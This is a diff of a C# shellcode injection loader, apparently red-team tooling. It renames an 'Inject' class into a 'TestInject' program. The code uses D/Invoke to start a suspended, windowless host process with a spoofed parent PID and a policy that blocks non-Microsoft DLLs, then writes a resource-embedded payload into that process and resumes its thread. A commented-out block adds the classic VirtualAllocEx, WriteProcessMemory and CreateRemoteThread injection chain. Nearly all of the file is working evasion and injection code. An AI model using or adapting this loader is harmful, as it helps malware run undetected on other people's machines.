@@ -9,32 +9,19 @@ using System.Threading;
 using System.Threading.Tasks;
 using DInvoke.DynamicInvoke;
 
-namespace Inject
+namespace TestInject
 {
-    public class Entry
+    internal class Program
     {
 
-        public static void Start()
+
+        //https://rastamouse.me/d-invoke-gadgettojscript/
+        static void Main(string[] args)
         {
-#if DEBUG
-            Console.WriteLine("Running Inject.");
-#endif
-
-            try
-            {
-                var app = Properties.Resources.Host;
-                //app = @"c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe";
-                //app = @"c:\windows\system32\dllhost.exe";
-
-                Thread.Sleep(1000);
-#if DEBUG
-                Console.WriteLine("Creating Process !");
-                Console.WriteLine(app);
-                Console.WriteLine("version 2.2");
-#endif
-
+            //try
+            //{
                 var startupInfoEx = new STARTUPINFOEX();
-
+                
                 _ = DInvoke.DynamicInvoke.Process.InitializeProcThreadAttributeList(ref startupInfoEx.lpAttributeList, 2);
 
                 const long BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON = 0x100000000000;
@@ -59,24 +46,28 @@ namespace Inject
                     (IntPtr)PARENT_PROCESS,
                     ref ppidPtr);
 
+
                 const uint CREATE_SUSPENDED = 0x00000004;
                 const uint DETACHED_PROCESS = 0x00000008;
                 const uint CREATE_NO_WINDOW = 0x08000000;
                 const uint EXTENDED_STARTUP_INFO_PRESENT = 0x00080000;
 
+
                 var result = DInvoke.DynamicInvoke.Process.CreateProcess(
-                    app,
                     null,
+                    Properties.Resources.Host,
                     CREATE_SUSPENDED | CREATE_NO_WINDOW | DETACHED_PROCESS | EXTENDED_STARTUP_INFO_PRESENT,
                     Environment.GetFolderPath(Environment.SpecialFolder.UserProfile),
                     ref startupInfoEx,
                     out var processInfo);
 
+                DInvoke.DynamicInvoke.Process.DeleteProcThreadAttributeList(ref startupInfoEx.lpAttributeList);
+                Marshal.FreeHGlobal(ppidPtr);
+                Marshal.FreeHGlobal(blockDllPtr);
+
                 var procId = processInfo.dwProcessId;
-                if(procId == 0)
-                {
-                    throw new InvalidOperationException("Process was not started!");
-                }
+                if (procId == 0)
+                    throw new InvalidOperationException("Process was not created");
 
                 byte[] shellcode = Properties.Resources.Payload;
 
@@ -139,24 +130,68 @@ namespace Inject
                 IntPtr.Zero);
 
                 _ = DInvoke.DynamicInvoke.Process.NtResumeThread(processInfo.hThread);
-            }
-            catch (Exception e)
-            {
-#if DEBUG
-                Console.WriteLine(e.ToString());
-#endif
-            }
-            finally
-            {
-                //Native.Kernel32.VirtualFreeEx(process.Handle, baseAddress, 0, Native.Kernel32.FreeType.Release);
-            }
 
+                int i = 0;
+
+                /*var procRes = CreateProcess(Properties.Resources.Host);
+                if (!procRes.HasValue)
+                    throw new InvalidOperationException($"Failed to create process, error code: {Marshal.GetLastWin32Error()}");
+
+
+                Process process = Process.GetProcessById(procRes.Value);
+                IntPtr pHandle = process.Handle;
+
+                var shellcode = Properties.Resources.Payload;
+
+
+                var baseAddress = Native.Kernel32.VirtualAllocEx(
+                    pHandle,
+                    IntPtr.Zero,
+                    shellcode.Length,
+                    Native.Kernel32.AllocationType.Commit |  Native.Kernel32.AllocationType.Reserve,
+                    Native.Kernel32.MemoryProtection.ReadWrite);
+
+                if (baseAddress == IntPtr.Zero)
+                    throw new InvalidOperationException($"Failed to allocate memory, error code: {Marshal.GetLastWin32Error()}");
+
+
+                IntPtr bytesWritten = IntPtr.Zero;
+                if (!Native.Kernel32.WriteProcessMemory(pHandle, baseAddress, shellcode, shellcode.Length, out bytesWritten))
+                    throw new InvalidOperationException($"Failed to write shellcode into the process, error code: {Marshal.GetLastWin32Error()}");
+
+                if (bytesWritten.ToInt32() != shellcode.Length)
+                    throw new InvalidOperationException($"Failed to write All the shellcode into the process");
+
+                if (!Native.Kernel32.VirtualProtectEx(
+                    pHandle,
+                    baseAddress,
+                    shellcode.Length,
+                    Native.Kernel32.MemoryProtection.ExecuteRead,
+                    out _))
+                    throw new InvalidOperationException($"Failed to cahnge memory to execute, error code: {Marshal.GetLastWin32Error()}");
+
+                IntPtr threadres = IntPtr.Zero;
+
+                IntPtr thread = Native.Kernel32.CreateRemoteThread(pHandle, IntPtr.Zero, 0, baseAddress, IntPtr.Zero, 0, out threadres);
+
+                if (thread == IntPtr.Zero)
+                    throw new InvalidOperationException($"Failed to create remote thread to start execution of the shellcode, error code: {Marshal.GetLastWin32Error()}");
+
+                //Native.Kernel32.WaitForSingleObject(thread, 0xFFFFFFFF);*/
+            //}
+            //catch (InvalidOperationException e)
+            //{
+            //    Debug.WriteLine(e.Message);
+            //}
+            //finally
+            //{
+            //    //Native.Kernel32.VirtualFreeEx(process.Handle, baseAddress, 0, Native.Kernel32.FreeType.Release);
+            //}
 
             Thread.Sleep(1000);
 
-#if DEBUG
-            Console.WriteLine("End Injects !");
-#endif
+
         }
+
     }
 }
